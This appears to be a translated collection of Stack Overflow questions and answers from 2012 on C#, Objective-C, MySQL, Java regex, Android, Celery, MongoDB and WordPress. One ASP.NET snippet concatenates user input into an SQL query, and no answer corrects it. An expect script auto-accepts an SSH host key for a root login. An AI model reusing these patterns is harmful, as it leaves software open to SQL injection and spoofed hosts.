您可以使用该`log4jdbc`库记录所有 JDBC 连接，请参阅[答案](https://stackoverflow.com/questions/17988231/how-to-log-jdbc-connection-activity)和[log4jdbc 存储库](https://github.com/arthurblake/log4jdbc)以获取更多信息

# c# - 试图在接口的实现中进行转换

> ID：12215571
> 
> 赞同：2
> 
> 时间：2012-08-31T12:39:22.197
> 
> 标签：c#

我正在尝试在 C# 中实现一个插件系统，为此我创建了以下类和接口：

包含在加载器和插件中：

```
interface IDevicePlugin {
    string GetName();
    string GetVersion();
} 
```

插件代码（编译为 .dll）

```
public class DummyPlugin : IDevicePlugin {
        protected string name;
        protected string version;

        public string GetName() {
            return name;
        }
        public string GetVersion() {
            return version;
        }
  } 
```

加载插件的代码如下：

```
IDevicePlugin thePlugin;
Assembly plugin = Assembly.LoadFrom("plugin.dll");

foreach (Type pluginType in plugin.GetTypes()) {
       if (pluginType.IsPublic && !pluginType.IsAbstract) {
            Type typeInterface = pluginType.GetInterface("IDevicePlugin", true);
            if (typeInterface != null) {
                 // the plugin implements our IDevicePlugin interface
                 thePlugin =  (IDevicePlugin)Activator.
                         CreateInstance(plugin.GetType(pluginType.ToString()));
            }
       }
} 
```

这会崩溃：

```
Unable to cast object of type 'PluginTest.DummyPlugin' to type 'PluginTest.IDevicePlugin'. 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T12:46:46.283

该接口存在两次：
一次在您的 plugin.dll 中，一次在您的加载程序中。
原因是您添加了对包含插件项目接口定义的 *.cs 文件的引用（=链接）。此外，相同的 *.cs 文件是加载程序项目的一部分。
因此，接口被编译到两个程序集中。这是两个不同的接口，即使它们的名称相同！

要解决此问题，您应该执行以下操作：

**将加载程序项目**的引用添加到插件项目
- 或者 -
为接口创建一个新项目并从加载程序和插件项目中引用此项目。

# c# - Protobuf-net 序列化 InvalidOperationException

> ID：12215573
> 
> 赞同：3
> 
> 时间：2012-08-31T12:39:27.643
> 
> 标签：c#, serialization, protobuf-net

我有一个自定义对象，我正在尝试使用 Protobuf-net 进行序列化，并引发以下异常：

InvalidOperationException 未处理：在写入字符串数据之前无法写入 Variant 标头

我发现有趣的是，在我的对象图中，没有任何地方正在序列化字符串。有没有人见过这样的错误，是否有已知的原因/修复？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T14:56:04.803

这看起来很像这里的错误：

[https://code.google.com/p/protobuf-net/issues/detail?id=218](https://code.google.com/p/protobuf-net/issues/detail?id=218)。

您是否在对象中的某个点序列化零长度字节 []？

# objective-c - 将数据从 URL 转换为 iPhone 中的图像

> ID：12215574
> 
> 赞同：0
> 
> 时间：2012-08-31T12:39:29.187
> 
> 标签：objective-c, json, image, nsdata, nsurl

在这里，我正在为静态 URL 工作。

我的代码：

```
NSURL *url = [[NSURL alloc] initWithString:@"http://cns.bu.edu/~lgrady/diagonal_line_nobreak_seg.jpg"];

NSData *myData = [NSData dataWithContentsOfURL:url];

img.image = [UIImage imageWithData:myData]; 
```

所以，我可以在 ImageView 中看到图像。

但是，在传递内部 Web 服务 URL 时。

我正在从 url 而不是 Image 中以字节为单位获取 Image 数据，如下所示：

```
{"AppBanner":"data:image\/png;base64,iVBORw0KGgoAAAANSUhEUg.....VORK5CYII="} 
```

但在上述代码的帮助下，我无法将这些数据转换为 Image。

那么如何将这些数据转换为图像呢？

任何解决方案？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:44:50.017

使用[NSData-Base64](https://github.com/l4u/NSData-Base64/)将base64转成NSData再转成UIImage

```
NSString  *strBase64 = [yourResposeDict objectForKey:@"AppBanner"];
//decode strBase64 using NSData-Base64 library 
```

# objective-c - 前向类属性 Objective C

> ID：12215575
> 
> 赞同：0
> 
> 时间：2012-08-31T12:39:32.417
> 
> 标签：objective-c, macos, cocoa

我正在制作一个 Mac OS X 应用程序，我试图让班级彼此了解

控制器创建 View1 和 View2

BaseView 具有 Controller 的属性

View1 和 View2 从 BaseView 扩展而来

这是我的例子

控制器类

```
#import <Cocoa/Cocoa.h>
#import "View1.h"
@class View1;
@interface Controller : NSViewController
{
    View1 *_view1;
}
@end

//////

#import "Controller.h"

@implementation Controller

- (id) init
{
    self = [super init];
    if( self )
    {
        _view1 = [[View1 alloc] initWithFrame:CGRectZero];
        _view1.controller = self;
    }
    return self;
}
@end 
```

BaseView 类

```
#import <Cocoa/Cocoa.h>
#import "Controller.h"
@class Controller;
@interface BaseView : NSView
{
    Controller *_controller;
}

@property (nonatomic,assign) Controller *controller;

@end

//////

#import "BaseView.h"

@implementation BaseView

@synthesize controller = _controller;

@end 
```

查看示例类

```
#import "BaseView.h"

@interface View1 : BaseView

@end

//////

#import "View1.h"

@implementation View1

@end 
```

但它给了我这个错误：

```
Controller.m:23:16: Property 'controller' cannot be found in forward class object 'View1' 
```

我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:49:29.850

当您在头文件中使用前向声明时（例如`@class View1;`），您不需要`#import`头文件。

在您的 View1.h 中，您没有声明 @class，这就是您得到错误的地方。不过，我建议您在头文件中使用前向声明，并在需要方法声明等时在实现文件中导入所需的头文件 - 这也将防止您出现头文件循环。

你的代码应该看起来像

```
@class BaseView; 
@interface View1 : BaseView

@end  

////// 

#import "View1.h"
#import "BaseView.h"
@implementation View1  

@end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:47:45.377

我认为问题可能不在您的代码中。

它们在同一个相对文件夹中吗？是`BaseView`在不同的位置吗？`User Header Search Paths`如果是这种情况，您可能必须转到您的项目设置并调整您的

此外，确保所有文件都针对当前运行的目标进行了设置，方法是在项目导航器上单击它们，然后在右侧菜单中检查标记了哪些目标

# mysql - MqSQL 排除之间的条目

> ID：12215577
> 
> 赞同：0
> 
> 时间：2012-08-31T12:39:42.570
> 
> 标签：mysql

我有下面的查询。我的目标是以某种方式排除 4 到 14 之间的条目而不显示它们。

```
SELECT code, register, data
    FROM code
    WHERE code
    BETWEEN 4
    AND 14
    ORDER BY code 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T12:42:29.483

只需`NOT`在列之后使用`code`。

```
SELECT code, register, data
    FROM code
    WHERE code NOT
    BETWEEN 4
    AND 14
    ORDER BY code; 
```

或者您也可以在列之前使用“NOT”`code`

```
SELECT code, register, data
    FROM code
    WHERE NOT code
    BETWEEN 4
    AND 14
    ORDER BY code; 
```

[看看这个](http://sqlfiddle.com/#!2/da483/2)SQLFiddle

参考。[MySQL：*expr 不在最小值和最大值之间*](http://dev.mysql.com/doc/refman/5.0/en/comparison-operators.html#operator_not-between)

# mysql - 包含 5 个指定值中的 2 个的行数

> ID：12215578
> 
> 赞同：0
> 
> 时间：2012-08-31T12:39:43.960
> 
> 标签：mysql

我有下表：

```
n1|n2|n3|n4|n5
 1| 5| 4| 7|26
26|80|75| 1|10
 5| 3| 2| 1|4
45|26|88| 3|66
88|48| 1|69|90 
```

我正在尝试获取出现 5 个指定值中的 2 个的行数。示例：26、1 和 88。在上表中，26 和 1 出现在 2 行中（第 1 和第 2 行）；26 和 88 出现在 1 行（第 4 行）；88 和 1 出现在 1 行（第 5 行）中。

我可以用

```
SELECT COUNT(*) FROM your_table
WHERE 1 IN (n1,n2,n3,n4,n5) OR 26 IN (n1,n2,n3,n4,n5) OR 88 IN (n1,n2,n3,n4,n5) 
```

但这样我得到的行也只包含 1 个数字。

在 mySQL 中是否有一种快速的方法来执行此操作，或者我应该在 PHP 中构建一些函数？

非常感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:48:00.227

[`in()`](http://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#function_in)如果值存在则返回 1，如果不存在则返回 0，因此您可以将它们相加并查找 2。

```
SELECT COUNT(*)
FROM your_table
WHERE ((1 IN (n1,n2,n3,n4,n5)) + (26 IN (n1,n2,n3,n4,n5)) + (88 IN (n1,n2,n3,n4,n5))) = 2 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T15:19:20.393

如果您构建一个（临时）`search`表来保存您希望找到的值：

```
CREATE TEMPORARY TABLE search (v INT PRIMARY KEY);
INSERT INTO search VALUES (26),(1),(88); 
```

然后您的查询变为：

```
SELECT   s1.v x, s2.v y, COUNT(*)
FROM     my_table
    JOIN search s1 ON s1.v IN (n1,n2,n3,n4,n5)
    JOIN search s2 ON s2.v IN (n1,n2,n3,n4,n5) AND s1.v < s2.v
GROUP BY x, y; 
```

在[sqlfile](http://sqlfiddle.com/#!2/f8868/1/0)上查看。

# c# - DataReader + DropDownList ASP.NET 项目

> ID：12215582
> 
> 赞同：1
> 
> 时间：2012-08-31T12:40:03.290
> 
> 标签：c#, asp.net, drop-down-menu, oledb, datareader

用户必须从下拉列表中选择一个值，然后应从数据库中提取数据并将其放入页面上的标签（即书名、作者、评级、评论）。

这是我到目前为止所拥有的，但它不起作用：

```
protected void DropDownList1_SelectedIndexChanged(object sender, EventArgs e)
{
    if (IsPostBack)
    {
        OleDbConnection con = new OleDbConnection(ConfigurationManager.ConnectionStrings["RegConnectionString"].ConnectionString);
        con.Open();

        OleDbCommand cmdReade = new OleDbCommand();
        OleDbDataReader reader = null;

        OleDbCommand cmdSelect = new OleDbCommand(@"SELECT * FROM Books WHERE bookName = '" + DdlSelectBook.SelectedItem.ToString() + "'");

        while (reader.Read())
        {
            lblBookName.Text = reader["bookName"].ToString();
            lblAuthor.Text = reader["Author"].ToString();
            lblRating.Text = reader["Rating"].ToString();
            lblComments.Text = reader["Comments"].ToString();
        }
    }
} 
```

数据库表是`BookName`, `Author`, `Rating`, `Comments`, 加上应该从项目中的文件夹中显示的图像与显示的书相匹配。

**我的代码有什么问题？**

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T12:51:53.490

问题是你的`reader is null.` Set`reader = SqlCommand.ExecuteReader()`

例子：

```
reader = cmdReade.ExecuteReader(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:54:54.513

你错过了

```
reader =cmdSelect.ExecuteReader(); 
```

# java - java中使用Pattern & Matcher类的模式匹配授权语句

> ID：12215583
> 
> 赞同：1
> 
> 时间：2012-08-31T12:40:05.333
> 
> 标签：java, pattern-matching, grant

对于 DB2 示例，授权如下所示。

```
grant insert,update,delete on ABC.TABLE_NAME to group DACT_RW, group DACT_RW_BATCH1 
```

我正在尝试使用以下内容构建正则表达式模式：

```
Pattern.compile("[g|G][r|R][a|A][n|N][t|T][ \\t\\n\\x0B\\f\\r]+[i|I][n|N][s|S][e|E][r|R][t|T][ \\t\\n\\x0B\\f\\r]*[,][ \\t\\n\\x0B\\f\\r]*[u|U][p|P][d|D][a|A][t|T][e|E][ \\t\\n\\x0B\\f\\r]*[,][ \\t\\n\\x0B\\f\\r]*[d|D][e|E][l|L][e|E][t|T][e|E][ \\t\\n\\x0B\\f\\r]+[o|O][n|N][ \\t\\n\\x0B\\f\\r]+" + eodAppendedDbObjectName + "[ \\t\\n\\x0B\\f\\r]+[t|T][o|O][ \\t\\n\\x0B\\f\\r]+[g|G][r|R][o|O][u|U][p|P][ \\t\\n\\x0B\\f\\r]+DACT_RW[ \\t\\n\\x0B\\f\\r]*[,][g|G][r|R][o|O][u|U][p|P][ \\t\\n\\x0B\\f\\r]+DACT_RW_BATCH1$"); 
```

但不知何故，即使我指定了正确的授权，它也没有得到匹配。

你能建议上面的模式编译有什么问题吗？或者建议更好的方法来匹配java中的模式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:23:29.977

我通过替换来简化了语句`[ \\t\\n\\x0B\\f\\r]`，`\\s`并且这行得通。

```
public static void main(String [] args) {
    String[] vals = {"grant     insert,update,delete on ABC.TABLE_NAME to group DACT_RW, group DACT_RW_BATCH1"};
    String eodAppendedDbObjectName = "ABC.TABLE_NAME";
    Pattern p = Pattern.compile("[gG][rR][aA][nN][tT]\\s+[iI][nN][sS][eE][rR][tT]\\s*,\\s*[uU][pP][dD][aA][tT][eE]\\s*,\\s*[dD][eE][lL][eE][tT][eE]\\s+[oO][nN]\\s+" + eodAppendedDbObjectName + "\\s+[tT][oO]\\s+[gG][rR][oO][uU][pP]\\s+DACT_RW\\s*,\\s*[gG][rR][oO][uU][pP]\\s+DACT_RW_BATCH1$");        
    for (String s : vals) {
        Matcher m = p.matcher(s);
        if (m.matches()) {
            System.out.println(s + " matches.");
        } else {
            System.out.println(s + " does not match.");
        }
    }
} 
```

# android - 应用内结算验证。服务器端代码示例是否存在于某处？

> ID：12215586
> 
> 赞同：0
> 
> 时间：2012-08-31T12:40:17.347
> 
> 标签：android, in-app-purchase, in-app-billing, android-billing

很多人问如何编写用于应用内计费验证的服务器端代码。任何人都可以发布这样的代码吗？或者知道这样的代码在哪里。如何安装在服务器上？有 [类似的科目](https://stackoverflow.com/questions/6371614/in-app-purchase-signature-verification-with-php-openssl)

我无法理解。我不知道php。这是我必须学习的下一个噩梦吗？

感谢您的帮助和建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-02T21:42:13.883

其实这很简单，你只需要在 PHP 中这样的一个小函数：

```
function checkPayment($data, $signature)
{
    $base64EncodedPublicKey = "yourBase64PublicKey";
    $openSslFriendlyKey = "-----BEGIN PUBLIC KEY-----\n" . chunk_split($base64EncodedPublicKey, 64, "\n") .  "-----END PUBLIC KEY-----";
    $publicKeyId = openssl_get_publickey($openSslFriendlyKey);

    $result =  openssl_verify ($data, base64_decode($signature), $publicKeyId, OPENSSL_ALGO_SHA1);

    /*
    if ($result == 1) {
        echo "Success";
    } elseif ($result == 0) {
        echo "Verification Failed";
    }
    */

    return $result;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T10:35:17.453

这是（未完成的）python示例：

```
from M2Crypto import BIO, RSA, EVP

ANDROID_PK = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAgmZW0GxWr0v1ndLfxHbV2ruWcmQ
<some lines skipped>
cwWjx5sWSahVp0M5aYRysSkGGjSxe1wIDAQAB
-----END PUBLIC KEY-----"""

def validate_google_play_signature(signed_data, signature_base64, public_key):
    # http://stackoverflow.com/a/546476/227024
    bio = BIO.MemoryBuffer(public_key)
    rsa = RSA.load_pub_key_bio(bio)
    pubkey = EVP.PKey()
    pubkey.assign_rsa(rsa)

    pubkey.reset_context(md="sha1")
    pubkey.verify_init()
    pubkey.verify_update(signed_data)

    signature = base64.b64decode(signature_base64)
    return bool(pubkey.verify_final(signature)) 
```

# android - 从非UI线程调用锁定Bitmap像素的本机函数是否安全？

> ID：12215587
> 
> 赞同：1
> 
> 时间：2012-08-31T12:40:23.883
> 
> 标签：android, android-ndk, java-native-interface

我正在实现包含不同图像过滤器（灰度、棕褐色等）预览的列表

我想将图像处理移出 UI 线程，但我不确定它是否安全。例如，当我要求`AndroidBitmap_lockPixels`UI线程尝试重绘时会发生`Bitmap`什么？`ImageView``ImageVIew`

**例子**

```
public void someMethod(){
    ImageView mImageView = /*initialization*/
    final Bitmap bmp = ((BitmapDrawable) mImageView.getDrawable()).getBitmap();
    new Thread(new Runnable(){
        @Override
        public void run(){
            applyFilter(bmp);
        }
    }).start();
}

public native void applyFilter(Bitmap bmp); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:58:15.683

我还没有尝试过这种情况；但是，您正在尝试修改当前正在使用`Bitmap`的`ImageView`. 我认为当`AndroidBitmap_lockPixels`被调用时，会发生一些异常，例如在`ImageView`尝试时崩溃`invalidate`或类似于`Access Violation`. 您可以制作图像的副本，对其进行处理，然后将新的应用`Bitmap`到`ImageView`; 这是完全安全的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T14:28:06.647

在这种情况下，位图有可能直接引用该 ImageView 中的某些内容。否则，位图将变成另一组 1 和 0。完成后，您也许可以制作 Bitmap 的副本并使用新图像更新 ImageView。在 Honeycomb (3.0) 之前的设备上要小心图像，因为它们处理位图很奇怪，您必须像在 C++ 程序中一样管理它们。

不应该，但 Android 中有时会隐藏一些东西，所以要小心。

更新：可能有一种方法可以在不复制的情况下修改图像，但我更多地基于一般图形而不是特定于 Android

# android - 设置活动/服务的参数

> ID：12215593
> 
> 赞同：0
> 
> 时间：2012-08-31T12:40:34.647
> 
> 标签：android, android-activity, android-service

有没有办法设置他们将在构造函数中作为参数接收的参数，如果它们被初始化为标准对象而不是意图？我不能使用存储在意图中的参数，因为发送意图并不一定会初始化活动/服务（它可能已经存在）。我可以使用清单文件设置自定义参数吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:55:27.597

启动一个 Activity 将始终启动 Activity，如果 Activity 已经在堆栈中，那么它也会启动该 Activity，除非没有指定一些意图过滤器。

对于Service，如果通过startService()启动服务，会调用onStartCommand()方法，该方法有一个Intent作为参数，可以通过该参数获取值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:56:03.073

> 发送意图并不一定会初始化活动/服务（它可能已经存在）。

如果您继续使用 Intents 但每次调用 TargetActivity 时都会删除它的历史记录。

```
Intent intent = new Intent(this,TargetActivity.class);
intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
startActivity(intent); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:21:55.580

我在这里找到了一个可能的解决方案：[Is it possible to have custom attributes in AndroidManifest.xml tags?](https://stackoverflow.com/questions/10311890/is-it-possible-to-have-custom-attributes-in-androidmanifest-xml-tags) 如果我想传递对象没有帮助，但对于简单类型来说已经足够了。

# linux - 如何单行这个“期望”命令？

> ID：12215596
> 
> 赞同：3
> 
> 时间：2012-08-31T12:40:54.723
> 
> 标签：linux, bash

我想把这个

```
#!/usr/bin/expect
spawn ssh-copy-id -i .ssh/id_dsa.pub root@testip
expect "Are you sure you want to continue connecting (yes/no)?"
send -- "yes\r"
expect eof 
```

我认为应该是

```
/usr/bin/expect -c 'expect "\n" { eval spawn ssh-copy-id -i .ssh/id_dsa.pub root@testip; expect "Are you sure you want to continue connecting (yes/no)?"; send -- "yes\r" }' 
```

但事实并非如此。

谁能看到它应该是怎样的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T20:01:29.000

也许你不再需要它了，但它应该是这样的：

```
/usr/bin/expect -c 'spawn ssh-copy-id -i .ssh/id_dsa.pub root@testip ; expect "Are you sure you want to continue connecting (yes/no)?" ; send -- "yes\r" ; expect eof' 
```

# java - 等效于具有多个字符分隔符的 StringTokenizer

> ID：12215598
> 
> 赞同：6
> 
> 时间：2012-08-31T12:41:03.990
> 
> 标签：java

我尝试将字符串拆分为标记。

标记分隔符不是单个字符，一些分隔符包含在其他分隔符中（例如 & 和 &&），我需要将分隔符作为标记返回。
StringTokenizer 无法处理多个字符分隔符。我认为使用 String.split 是可能的，但无法猜测出适合我需要的神奇正则表达式。

任何的想法 ？

例子：

```
Token delimiters: "&", "&&", "=", "=>", " "  
String to tokenize: a & b&&c=>d  
Expected result: an string array containing "a", " ", "&", " ", "b", "&&", "c", "=>", "d" 
```

--- 编辑 ---
感谢大家的帮助，Dasblinkenlight 为我提供了解决方案。这是我在他的帮助下编写的“即用型”代码：

```
private static String[] wonderfulTokenizer(String string, String[] delimiters) {
  // First, create a regular expression that matches the union of the delimiters
  // Be aware that, in case of delimiters containing others (example && and &),
  // the longer may be before the shorter (&& should be before &) or the regexpr
  // parser will recognize && as two &.
  Arrays.sort(delimiters, new Comparator<String>() {
    @Override
    public int compare(String o1, String o2) {
      return -o1.compareTo(o2);
     }
  });
  // Build a string that will contain the regular expression
  StringBuilder regexpr = new StringBuilder();
  regexpr.append('(');
  for (String delim : delimiters) { // For each delimiter
    if (regexpr.length() != 1) regexpr.append('|'); // Add union separator if needed
    for (int i = 0; i < delim.length(); i++) {
      // Add an escape character if the character is a regexp reserved char
      regexpr.append('\\');
      regexpr.append(delim.charAt(i));
    }
  }
  regexpr.append(')'); // Close the union
  Pattern p = Pattern.compile(regexpr.toString());

  // Now, search for the tokens
  List<String> res = new ArrayList<String>();
  Matcher m = p.matcher(string);
  int pos = 0;
  while (m.find()) { // While there's a delimiter in the string
    if (pos != m.start()) {
      // If there's something between the current and the previous delimiter
      // Add it to the tokens list
      res.add(string.substring(pos, m.start()));
    }
    res.add(m.group()); // add the delimiter
    pos = m.end(); // Remember end of delimiter
  }
  if (pos != string.length()) {
    // If it remains some characters in the string after last delimiter
    // Add this to the token list
    res.add(string.substring(pos));
  }
  // Return the result
  return res.toArray(new String[res.size()]);
} 
```

如果您有许多字符串要通过仅创建一次 Pattern 来标记化，则可以进行优化。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:43:47.873

您可以使用[`Pattern`](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html)和 一个简单的循环来实现您正在寻找的结果：

```
List<String> res = new ArrayList<String>();
Pattern p = Pattern.compile("([&]{1,2}|=>?| +)");
String s = "s=a&=>b";
Matcher m = p.matcher(s);
int pos = 0;
while (m.find()) {
    if (pos != m.start()) {
        res.add(s.substring(pos, m.start()));
    }
    res.add(m.group());
    pos = m.end();
}
if (pos != s.length()) {
    res.add(s.substring(pos));
}
for (String t : res) {
    System.out.println("'"+t+"'");
} 
```

这[会产生](http://ideone.com/WwR5O)以下结果：

```
's'
'='
'a'
'&'
'=>'
'b' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:59:15.473

拆分不会为您执行此操作，因为它删除了分隔符。您可能需要自己标记字符串（即 for 循环）或使用类似 [http://www.antlr.org/的框架](http://www.antlr.org/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:55:13.873

试试这个：

```
String test = "a & b&&c=>d=A";
String regEx = "(&[&]?|=[>]?)";

String[] res = test.split(regEx);
for(String s : res){
    System.out.println("Token: "+s);
} 
```

我在末尾添加了“=A”以表明它也被解析了。

正如另一个答案中提到的，如果您需要将分隔符保留在结果中的非典型行为，您可能需要自己创建解析器....但在这种情况下，您真的必须考虑什么是“分隔符”你的代码。

# python-2.7 - CELERY_ROUTES 似乎被忽略了

> ID：12215602
> 
> 赞同：4
> 
> 时间：2012-08-31T12:41:22.103
> 
> 标签：python-2.7, celery, django-celery

我正在使用 django 和 djcelery。由于有些任务有点重，我希望它们在一个单独的队列中。

根据[用户指南](http://celery.github.com/celery/userguide/routing.html)中关于自动路由的部分，您可以通过设置变量来实现`CELERY_ROUTES`。但是这不起作用，所有任务最终都在默认队列中。当我在我的任务类中明确设置队列变量时，它确实有效。

在我的设置文件中，我有

```
CELERY_ROUTES = {"analysis.tasks.analyze_item": {"queue": "analysis_queue"}} 
```

我开始芹菜工人

python manage.py celeryd -Q analysis_queue

我的任务.py

```
class Analyze(Task):
    queue = 'analysis_queue' # <--- without this it doesn't work..
....

analyze_item = registry.tasks[Analyze.name] 
```

# java - 如何在搜索时将搜索到的文本保留在 SearchViews 文本字段中？

> ID：12215603
> 
> 赞同：0
> 
> 时间：2012-08-31T12:41:22.400
> 
> 标签：java, android

我的操作栏中有一个`SearchView`。当用户搜索查询并按下键盘上的“开始”按钮时，搜索意图被传递给我的活动，但搜索字段折叠并且查询文本丢失。我怎样才能防止这种情况发生？我希望文本保留在搜索字段中，直到用户明确清除。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:55:46.747

当搜索事件发生时（setOnSearchClickListener）使用getQuery（）单击“Go”按钮时，您可以将搜索请求存储在字符串变量或[共享首选项中，然后将它们](http://developer.android.com/reference/android/content/SharedPreferences.html)[作为查询（setQuery）写回或作为提示 (setQueryHint)](http://developer.android.com/reference/android/widget/SearchView.html)。

**编辑**（根据您可以在此答案下方阅读的问题）

如果在每次搜索后重新创建活动，您如何存储查询字符串？如果您有一些在应用程序运行时持久的服务，您可以将它存储在那里，但这并不是那么优雅。最简单的方法是使用[SharedPreferences](http://developer.android.com/reference/android/content/SharedPreferences.html)。这是一个持久（键、值）存储，您可以在整个应用程序中使用它来存储和检索值。

您启动 SharedPreference 与

```
SharedPreferences prefs = getSharedPreferences("mysharedprefenrences", 0); 
```

字符串可以是任何你想要的。每当您在应用程序中使用相同的字符串创建 SharedPreferences-Object 时，您将再次访问这些值。

要获取字符串，例如您的搜索查询，请使用

```
String aString = prefs.getString("searchQuery", "") 
```

如果尚未设置查询（在本例中为“”），则第二个字符串为默认值。

执行 setOnSearchClickListener 后，您可以使用编辑器存储查询。

```
Editor editor = prefs.edit();
editor.putString("searchQuery", queryString);
editor.commit(); 
```

现在下次创建活动时，将找到您存储的字符串而不是默认字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T13:44:27.923

我的解决方案非常简单。显然，我没有`android:launchMode`为活动正确设置。理想情况下，提供搜索功能的活动应该是一个单一的顶部，这样用户就不必在单击“返回”按钮时向后浏览所有先前的搜索。我的不是。因此，每次搜索时，都会启动一个新的搜索活动实例并将其添加到视图堆栈中。

我在正确的活动下将此添加到我的清单文件中。

```
android:launchMode="singleTop" 
```

# android - 数组中的字符串操作

> ID：12215610
> 
> 赞同：-1
> 
> 时间：2012-08-31T12:41:45.953
> 
> 标签：android, arrays

如何解决此错误 **`The operator += is undefined for the argument type(s) String[][], String`**

```
 SmsMessage[] msgs = null;
   String [][]str = null;  

    if (bundle != null)
    {
        //---retrieve the SMS message received---
        Object[] pdus = (Object[]) bundle.get("pdus");
        msgs = new SmsMessage[pdus.length];            
        for (int i=0; i<msgs.length; i++){
            msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
            str += "SMS from " + msgs[i].getOriginatingAddress();                     
            str += " :";
            str += msgs[i].getMessageBody().toString();
            str += "\n"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:45:02.047

该错误几乎说明了一切 - 您不能`+=`在 Java 中使用数组。为什么不使用 List 来构建 String 值，然后在完成后将其转换为数组？

```
 List<String> str = new ArrayList<String>();  

    for (int i=0; i<msgs.length; i++){
        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
        str.add("SMS from " + msgs[i].getOriginatingAddress());                     
        str.add(" :");
        ...

    String[] strArray = str.toArray(new String[str.size()]); 
```

# mongodb - mongodb 从查找查询中检索数组值

> ID：12215615
> 
> 赞同：2
> 
> 时间：2012-08-31T12:41:57.377
> 
> 标签：mongodb

这是我的 mongodb 文档：

```
{ "FRIENDS" : [     
    { "LOC" : "13.039064033333332,77.5547927", "NAME" : "A1", "PHONE_NUMBER" : "817361155" } ],
 "MYID" : "349512956", 
"MYLOCATION" : "13.0389541,77.5549799", 
"OCCASION" : "cafe", 
"_id" : ObjectId("503d87150f43159357000001"), 
"average" : "13.0389541,77.5549799" } 
```

这是我的查询

```
> db.test_collection.find({"MYID":"349512956"},{"FRIENDS.PHONE_NUMBER":"817361155"}); 
```

和输出

```
{ "FRIENDS" : [ { "PHONE_NUMBER" : "817361155" } ], "_id" : ObjectId("503d87150f43159357000001") } 
```

但是，我希望结果中包含整个朋友文档。地点、姓名、电话号码。我如何得到这些？任何帮助将不胜感激。我正在搜索 monogo 文档，但找不到我的答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:47:04.683

试试这个

```
// i.e., select * from things where MYID=somethig and PHONE_NUMBER="foo"
db.test_collection.find({"MYID":"349512956", "FRIENDS.PHONE_NUMBER":"817361155"}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:31:09.967

更具体地说，第二个参数选择要输出的字段。看下面的实际实现：

```
> db.test_collection.find
function (query, fields, limit, skip, batchSize, options) {
    return new DBQuery(this._mongo, this._db, this, this._fullName, 
           this._massageObject(query), fields, limit, skip, batchSize, options || 
           this.getQueryOptions());
} 
```

# wordpress - Wordpress：菜单（外观）中的链接未完全保存

> ID：12215624
> 
> 赞同：0
> 
> 时间：2012-08-31T12:42:22.747
> 
> 标签：wordpress, menu

再会，

只是想为我的外观>菜单问题寻求可能的解决方案，并确认这是否是服务器问题。

我将一个 WordPress 站点转移到另一台服务器，每当我在菜单中添加或多或少 100 个链接/项目并单击“保存”后，只剩下大约 50-60 个并保存并出现在网站上。

WordPress 站点在其以前的服务器中很好（所有链接都已保存），我认为这是一个服务器问题，但不知道要实施什么解决方案来解决这个问题。

顺便说一句，菜单是通过 Jquery Mega Menu 显示的，我尝试禁用新服务器中的所有插件，使 Mega Menu 成为唯一启用的插件，但结果仍然相同（只保存了一半的链接）。

保存后不会出现错误消息。我知道的 php 内存是 256Mb，php 版本是 5.3.15（根据我们的 ISP）。没有致命错误消息。它只是说明菜单已保存。不幸的是，将拖入菜单的链接/页面数量减少了一半。

这里有人知道任何解决方案吗？

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:46:07.740

是的，确认这是服务器问题 - 它与所谓的“Suhosin”变量有关，为了解决问题，您需要编辑（或有权访问服务器配置文件的人）并在**php.ini**中添加以下行：

```
suhosin.post.max_vars = 5000    
suhosin.request.max_vars = 5000 
```

之后，最好重新启动 Apache 服务器（尽管不是必需的）。

# jqgrid - 列的 JqGrid 工具提示

> ID：12215627
> 
> 赞同：3
> 
> 时间：2012-08-31T12:42:29.950
> 
> 标签：jqgrid, jqgrid-asp.net, jqgrid-formatter

我们如何在列级别添加工具提示。我所说的列级别的意思是所有行（属于同一列）都应该具有相同的工具提示内容。

例如，考虑一个名为“经理姓名”的列。该列的所有行都应将工具提示显示为“单击此处查看经理详细信息”。

